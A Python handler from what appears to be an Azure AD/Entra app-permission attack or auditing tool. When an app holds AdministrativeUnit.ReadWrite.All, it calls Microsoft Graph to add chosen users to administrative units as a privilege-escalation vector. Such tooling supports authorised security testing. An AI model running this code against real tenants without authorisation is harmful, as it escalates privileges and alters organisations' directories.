from typing import List
from attacks.handlers.base_handler import AttackHandler, Request, Response
from utils import logger
import requests

logger = logger.createLogger('attacks.handlers.au_handler')


class AU_Handler(AttackHandler):
    def handle(self, request: Request,responses:List[Response]):
        # TODO map request.roles to fit with this attack
        if "AdministrativeUnit.ReadWrite.All" in request.roles:
            logger.info('tid: %s, appid: %s may be vulnerable to administrativ_unit vector' % (request.tenantId,request.appId))
            status = False
            attack_name = "AdministrativeUnitRWVectors"
            message = ""
            error = "AdministrativeUnitRWVectors - failed"
            conf = request.attack_config['administrativeUnits']
            logger.debug("AdministrativeUnit.ReadWrite.All - Allows the app to create, read, update, and delete administrative units and manage administrative unit membership without a signed-in user.")
            logger.debug("Attack vector - Privilege escalation.")
            logger.info("Pay attention that it the attacker must be a part of the administrative unit and he must have a  role on the unit.")          
            
            
            try:
                for au in conf["AU"]:
                    create_message_URL = "https://graph.microsoft.com/v1.0/directory/administrativeUnits/" + au + "/members/$ref"
                    for user in conf["users"]:
                        message_obj = {
                            "@odata.id": "https://graph.microsoft.com/beta/directoryObjects/" + user
                        }

                        result = requests.post(create_message_URL, json=message_obj, headers=request.request_headers)
                        
                        
                        if result.status_code == 400: # action already happend
                            raise
                        elif result.status_code == 204:
                            status = True
                            create_message_URL = "https://graph.microsoft.com/v1.0/directory/administrativeUnits/" + au
                            result = requests.get(create_message_URL, json=message_obj, headers=request.request_headers)
                            if result.status_code == 200:
                                aus = result.json()
                                auName = aus["displayName"]
                                message += "Action succeeded: %s was added to administrative unit: %s\n" % (user, auName)
                            else: 
                                message += "Action succeeded: %s was added to administrative unit: %s\n" % (user, au)
                if message == "":
                    message = error
            except:
                logger.error("Unexpected exception in au_Handler function")

            
            responses.append(Response(attack_name,request.tenantId,request.appId,status,message))



        return super().handle(request,responses)
